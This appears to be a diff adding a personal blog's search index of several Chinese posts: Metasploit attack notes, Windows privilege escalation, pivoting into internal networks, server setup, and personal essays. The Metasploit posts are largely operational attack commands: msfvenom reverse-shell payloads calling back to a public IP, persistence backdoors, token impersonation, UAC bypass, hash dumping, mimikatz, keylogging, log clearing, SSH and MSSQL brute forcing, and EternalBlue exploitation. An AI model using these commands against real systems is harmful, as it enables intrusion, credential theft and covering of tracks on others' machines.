@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title><![CDATA[Msf的一些常用操作(入坑笔记)]]></title>
+    <url>%2F2017%2F11%2F06%2FMsf%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%EF%BC%88%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0%EF%BC%89%2F</url>
+    <content type="text"><![CDATA[Msf的一些常用操作将这两天自己的msf学习记录一下，方便自己以后修改！！！ payload的几个常用生成 生成windows下的反弹木马 msfvenom -p windows/meterpreter/reverse_tcp LHOST=60.205.212.140 LPORT=8888 -f exe &gt; 8888.exe // -p &lt; payload &gt; -f &lt; format&gt; -o &lt; path&gt; = &gt; 监听 use exploit/multi/handlerset PAYLOAD windows/meterpreter/reverse_tcpset LHOST 172.17.150.246 //阿里云云服务器这里是内网ipset LPORT 8888exploit -j PHP： msfvenom -p php/meterpreter_reverse_tcp LHOST=60.205.212.140 LPORT=8888 -f raw &gt; shell.phpuse exploit/multi/handlerset PAYLOAD php/meterpreter_reverse_tcpset LHOST 172.17.150.246set LPORT 8888exploit -j shellcode： msfvenom -p windows/meterpreter/reverse_tcp LPORT=1234 LHOST=60.205.212.140 -e x86/shikata_ga_nai -i 11 -f py &gt; 1.py //-e 使用编码 -i 编码次数 内网代理 首先需要链接sessions,在此基础下添加路由 meterpreter &gt; run get_local_subnets //获取网段meterpreter &gt; run autoroute -s 172.2.175.0/24 //添加路由meterpreter &gt; run autoroute -p //查看路由meterpreter &gt; run autoroute -d -s 172.2.175.0 //删除网段meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24 //探测该网段下的存活主机。meterpreter &gt; background //后台sessions 提权 getsystem meterpreter &gt; getsystem //直getsystem提权，最常用简单的办法 使用exp提权 meterpreter &gt; background //先后台运行会话[*] Backgrounding session 1…msf &gt; use post/windows/escalate/ms10_073_kbdlayoutmsf &gt; show optionsmsf &gt; set session 1 //设置要使用的会话msf post(ms10_073_kbdlayout) &gt; exploit注意：如果创建了一个system进程，就可以立马sessions 1进入会话，然后ps查看进程，使用migrate pid注入到进程。或者直接：meterpreter &gt; run post/windows/escalate/ms10_073_kbdlayout 3.盗取令牌 meterpreter &gt; use incognito //进入这个模块meterpreter &gt; list_tokens –u //查看存在的令牌meterpreter &gt; impersonate_token NT AUTXXXX\SYSTEM //令牌是DelegationTokens一列，getuid查看，两个斜杠 注：只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌，一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的，建好的账户没有这个权限。使用菜刀（IIS服务器权限）反弹meterpreter是服务型权限。 4.Bypassuac msf &gt; use exploit/windows/local/bypassuac //32位与64位一样，其他几个模块也一样msf &gt; show optionsmsf &gt; set session 4msf &gt; run //成功后会返回一个新的session，进入新会话，发现权限没变，使用getsystem即可完成提权 5.Hash meterpreter &gt; run post/windows/gather/smart_hashdump //读取hash这种做法最智能，效果最好。 建立持久后门 服务启动后门： meterpreter &gt; run metsvc -A //再开起一个终端，进入msfconsolemsf &gt; use exploit/multi/handler //新终端中监听msf &gt; set payload windows/metsvc_bind_tcpmsf &gt; set LPORT 31337msf &gt; set RHOST 192.168.0.128msf &gt; run //获取到的会话是system权限 启动项启动后门 meterpreter &gt; run persistence -X -i 10 -p 6666 -r 192.168.71.105 // -X 系统开机自启，-i 10 10秒重连一次，-p 监听端口，-r 监听机。直接监听就好了，他自己会链接回来。注意到移除 persistence 后门的办法是删除 HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ 中的注册表键和 C:\WINDOWS\TEMP\ 中的 VBScript 文件。缺点：容易被杀毒软件杀 。 这两个后门有个弊端，在进程中都会存在服务名称为meterpreter的进程。 漏洞扫描 对端口都扫描 use auxiliary/scanner/portscan/tcpshow optionsset rhosts 192.168.2.1-255set ports 21,22,25,443,445,1433,3306set threads 20exploit mssql开发利用 对各个ip是否有mssql服务的探测use scanner/mssql/mssql_ping //测试MSSQL的存在和信息show optionsset rhosts 192.168.2.1-255set threads 30exploit 对扫描到的ip进行爆破use scanner/mssql/mssql_login //具体配置show options。 sa权限对其利用use admin/mssql/mssql_execset rhost 192.168.2.10set password saset CMD cmd.exe /c echo helloexploit mysql开放利用 爆破ssh模块： use auxiliary/scanner/ssh/ssh_loginset rhosts 7.7.7.20set username rootset pass_file /root/pass.txt //加载字典，可以收集密码做字典set threads 50run 通过nmap扫描基本漏洞： msf &gt; nmap –script=vuln 受害靶机ip地址msf &gt; nmap –script=mysql-info 192.168.0.4 //扫描mysql数据库信息 版本 等.. 最后清除记录 msf &gt; clearev //删除目标机上的应用程序、系统和安全日志。 一些常用命令 查看系统命令 sysinfo 截图 screenshot 查看是否是虚拟机 run checkvm 查看运行木马的用户 getuid 注入到进程 migrate pid //成功会提示successfully 加载mimikatz模块 meterpreter &gt; load mimikatz meterpreter &gt; wdigest //需要system权限 获取键盘记录：meterpreter&gt; run post/windows/capture/keylog_recorder #运行键盘记录模块，他自己创建本文。]]></content>
+      <categories>
+        <category>msf</category>
+      </categories>
+      <tags>
+        <tag>msf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[administrator提升system权限小技巧]]></title>
+    <url>%2F2017%2F11%2F05%2Fadministrator%E6%8F%90%E5%8D%87system%E6%9D%83%E9%99%90%E5%B0%8F%E6%8A%80%E5%B7%A7%2F</url>
+    <content type="text"><![CDATA[正文当administrator权限进入服务器后，不利用exp的情况下提升到system权限。 windows2003通过shift后门弹出来的cmd是system权限。 windows2008依次执行下面两条命令： sc Create SuperCMD binPath= “cmd /K start” type= own type= interact sc start SuperCMD 当执行完第二条后会出现如图情况：进入后弹出来的cmd就是system权限了。]]></content>
+      <categories>
+        <category>服务器</category>
+      </categories>
+      <tags>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[那一箭回来了]]></title>
+    <url>%2F2017%2F11%2F05%2F%E9%82%A3%E4%B8%80%E7%AE%AD%E5%9B%9E%E6%9D%A5%E4%BA%86%2F</url>
+    <content type="text"><![CDATA[致曾经的那个男人 那一刻，ruler手中的韦鲁斯好像不听自己的使唤了，ruler大惊:“等等，我的韦鲁斯好像自己动起来了思密达!” “什么?要不要暂停比赛?” 安掌门急切的问道 “啊，不行，来不及了，这波团我们一定要…” 说时迟那是快，韦鲁斯宛如天神下凡一般一个箭步冲上前去，“哈啊!”随着一声大吼，双龙带着箭雨朝着faker涌去，“坏了，faker还有闪现!这样…会输的啊!”ruler急得眼睛有些发红，但就在那一瞬间，他仿佛看到了什么，他的嘴张的大大的，却什么也说不出来…“完了！”尺帝心想。等等，这个大没有飞向小炮，而是飞向了faker。faker也没有想到，他把e给了小炮。瞬间叠满的w，韦鲁斯e出手，半血直接没。再平a两下，尺帝拉起了弓箭那一刻的尺帝，有了一种异样的感觉，他感觉自己被人握住了双手，倾尽了今年的神力。这一箭，划破苍穹，faker的屏幕陷入了黑暗。faker掩面痛哭，一年双亚，skt王朝陷落。 比赛结束后，所有人都站起来欢呼，只有ruler发呆似的盯着电脑的屏幕“不对，不是的，他明明有闪现…为什么….啊，是那个!”他猛然想起，就在韦鲁斯抬手的一瞬间，一道黑影好像在双龙之中飞了过去，其速度竟高过faker的反应速度….与其说是箭….那简直可以算得上是一发入魂的子弹。ruler恍然大悟，猛地抬头向观众席看去，却只看到一个背影，那高大肥胖的身躯在那一刻显得如此坚实，虽然看不清3级头盔下的面目，可他身后背着的98k却是那么耀眼… “thankyou….thankyou weiless 思密达….” ruler小声地自言自语到，只有他知道这冠军究竟属于谁…..后记 几个月后，拳头致电三星… “ruler，这次的冠军皮肤就做韦鲁斯的吧，你有什么想法吗，哪里要帅气一点之类的?” “帅气的吗….不，我觉得我用的那个皮肤已经几乎是完美的了，如果说有哪里能改进….那就请在他的翅膀上刻一个V吧。” ruler笑到，于此同时，海岸的另一半，那个人终于满意地咬下了烧鸡上最后一块肉…. 续：或许GODV玩的LOL才是玩的游戏，不是一种职业，更不是一种工作.]]></content>
+      <categories>
+        <category>娱乐</category>
+      </categories>
+      <tags>
+        <tag>LOL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[MSF通过跳板入内网]]></title>
+    <url>%2F2017%2F11%2F04%2F%E4%BD%BF%E7%94%A8MSF%E8%B7%AF%E7%94%B1%E8%BD%AC%E5%8F%91%E5%AE%9E%E7%8E%B0MSF%E6%A1%86%E6%9E%B6%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%2F</url>
+    <content type="text"><![CDATA[基本概念MSF的跳板功能，其实是MSF框架中自带的一个路由转发功能，其实现过程就是MSF框架在已经获取的meterpreter shell的基础上添加一条去往“内网”的路由，此路由的下一跳转发，即网关是MSF攻击平台与被攻击目标建立的一个session会话，具体理解大家可以见拓扑图：通过msf添加路由功能，可以直接使用msf去访问原本不能直接访问的内网资源，只要路由可达了那么我们使用msf的强大功能，想干什么就干什么了。 msf 跳板实现过程 基本过程 需要有一个已经获取的meterpreter 会话； 获取内网地址网段 在MSF平台上添加去往“内网网段”的路由 实现过程 已经获取一个meterpreter shell 第1个条件，是我们要想办法获取一个MSF攻击平台与目标主机的shell会 话（meterpreter）,然后利用此会话。 MSF 路由添加帮助查询命令如下：meterpreter &gt; run autoroute -hrun autoroute -s 172.2.165.0/24 //添加172.2.165.0-255这个ip段run autoroute -s 172.2.165.75 //添加单个ip地址run autoroute -p //查看路由的添加情况run autoroute -d -s 172.2.165.0 //删除172.2.165.0/24这个ip路由run get_local_subnets //获取被攻击目标内网地址网段 具体操作过程 首先获得跳板机的sessions，然后进入meterpreter meterpreter &gt; run get_local_subnets //执行获取肉鸡所在内网网段。 meterpreter &gt; run autoroute -s 10.48.8.0/24 //添加路由 meterpreter &gt; run autoroute -p //查看路由 meterpreter &gt; background //需要退到MSF攻击平台的操作面,调用其他模块。 msf&gt;use auxiliary/scanner/smb/smb_ms17_010 //调用扫描器来扫ms17-10 show options //查看设置 set rhosts 10.48.8.0/24 //设置要扫描的ip段 set threads 50 //设置线程50 run //运行 这里就可以探测到哪些电脑存在漏洞了 调用攻击模块ms17-10攻击了。 use exploit/multi/handler //得先进入监听模板，因为攻击成功后会直接反弹回会话。 msf exploit(handler) &gt; use exploit/windows/smb/ms17_010_eternalblue //使用exp set rhost 10.48.8.236 //设置存在漏洞的目标 exploit //然后就开始攻击了，成功后会直接弹回会话。 文章转载：使用 MSF 路由转发实现MSF框架的内网渗透结语：因为文章思路清新明确，所以转载记录。]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>Msf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Windows建立与Ubuntu16.04远程桌面链接]]></title>
+    <url>%2F2017%2F11%2F03%2FWindows%E4%B8%8B%E9%93%BE%E6%8E%A5Ubuntu%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%2F</url>
+    <content type="text"><![CDATA[安装步骤 安装xrdpsudo apt-get install xrdp 安装vnc4serversudo apt-get install vnc4server 安装xubuntu-desktop(这一步会稍微有点久)sudo apt-get install xubuntu-desktop 向xsession中写入xfce4-sessionecho “xfce4-session” &gt;~/.xsession 开启xrdp服务sudo service xrdp restart 记得要在在安全规则或者防火墙里面添加3389端口通过，别给过滤了。然后windows直接开起远程链接，链接外网即可，会得到如图：这里他默认是可以登陆root，但是我并没有登陆成功，好像需要登陆4次失败以后，第5次开始才可以登陆。这里我们直接创建一个其他用户，即可立马登陆上去。登陆上去后打开cmd,输入su回车，然后输入root账号的密码即可再次cmd下变成root用户了，exit退出root。]]></content>
+      <categories>
+        <category>服务器</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Linux下搭建外网Msf]]></title>
+    <url>%2F2017%2F11%2F01%2Flinux%E6%90%AD%E5%BB%BA%E5%A4%96%E7%BD%91%E7%9A%84msf%E7%AC%94%E8%AE%B0%2F</url>
+    <content type="text"><![CDATA[准备1.首先去阿里云买一个学生机。点我：阿里云学生机购买地址2.预装环境选择Ubuntu，版本无所谓，不过阿里的好像就16.04 64位。地区什么的选择你所在地区，其他都无所谓。(这里可以先买一个月来试试水) 开始安装 首先登陆阿里云云服务器控制台。点我找到如下界面。选择你相关的地区，就可以看到你的实例了，然后这里记住你的两个ip地址即可。然后下载一个xshell与xftp来链接服务器。(具体怎么弄百度一下，很简单)。如果忘记了登陆密码点击这里修改一下就好了。现在环境我们就准备好了。 在Xshell里面依次执行下面的命令：1.curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall2.chmod 755 msfinstall3../msfinstall然后就成功安装了。 自己启动msf：msfconsole这里他会提示你是否创建新的数据库，输入：no在回车就好了。 要是关于数据库问题失败的话就自己建立一个postgresql数据库1、apt-get install postgresql //安装postgresql数据库2、su - postgres //切换到postgres用户3、psql //登陆postgresql数据库，首次登陆没有密码4、\password postgres //修改数据库用户postgres的密码安装数据库的时候会自动创建系统用户postgres,数据库用户postgres,数据库postgres msf使用数据库 1、msfconsole //启动msf2、db_connect postgres:hehehe@127.0.0.1/test //用户名，密码，地址，自己随意编造的名字。3、db_status //查看数据库连接状态,如果提示postgresql connected to test则成功。还是不行就先执行db_disconnect命令，在db_connect database。 使用msf做简单反弹 首先你得登陆阿里云控制中心，找到安全组配置如下：入口向与进口向保持一致。 msfvenom -p windows/meterpreter/reverse_tcp LHOST=公网ip LPORT=你添加的端口 -f exe &gt; 8888.exe 然后就是监听。set LHOST 内网ip //注意这里的监听ip是你的内网ip，不是公网ip。这样就成功搭建了一个外网msf了。 安装Shellinabox 在Debian / Ubuntu系统上： $ sudo apt-get install shellinabox 然后直接执行命令： 1.SHELLINABOX_ARGS=&quot;--no-beep -s /:SSH:服务器ip&quot; 2./etc/init.d/shellinaboxd restart //这是启动该服务，在访问https://ip:4200 即可，4200是默认端口，https传输。这里证书会报错，添加例外就可以了。 如果想修改端口呢，执行下面命令： shellinaboxd -t -b -p 1234 #-b选项代表在后台启动，-t选项表示不使用https方式启动 -p选项表示指定端口。 这里访问http://ip:1234 即可，采用http传输，也没证书的事情了。 观察服务监听的端口：netstat -tnlp | grep shellinabox 注意：这里root用户是登陆默认是不能登陆的，得使用其他用户登陆，新建一个用户adduser name输入2次密码，创建成功。 相关链接：shellinabox搭建过程msf安装过程]]></content>
+      <categories>
+        <category>服务器</category>
+      </categories>
+      <tags>
+        <tag>Msf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[走过的风景，看过的人]]></title>
+    <url>%2F2017%2F10%2F30%2F%E8%B5%B0%E8%BF%87%E7%9A%84%E9%A3%8E%E6%99%AF%E7%9C%8B%E8%BF%87%E7%9A%84%E4%BA%BA%2F</url>
+    <content type="text"><![CDATA[致自己的迷茫 台上的戏已唱罢三折，杯中的酒已过三更，梦不见醒，谁去说破这水月假空花，寒山、老僧，请点了这冻蜡，着了这袈裟，度化了这些，戏梦人生。 十六岁的天空: 奋着一腔热血与期待的来到了一个令我终身都无法忘记的地方，在这里我遇到了我的朋友，兄弟以及我现在最思恋的那个人。 Love71’blog]]></content>
+      <tags>
+        <tag>随笔</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Love]]></title>
+    <url>%2F2017%2F10%2F25%2Flove%2F</url>
+    <content type="text"><![CDATA[这是第一篇文章 既然做出了选择，那又何必问为什么选择。 L o v e 7 1]]></content>
+      <categories>
+        <category>生活</category>
+      </categories>
+      <tags>
+        <tag>随笔</tag>
+      </tags>
+  </entry>
+</search>
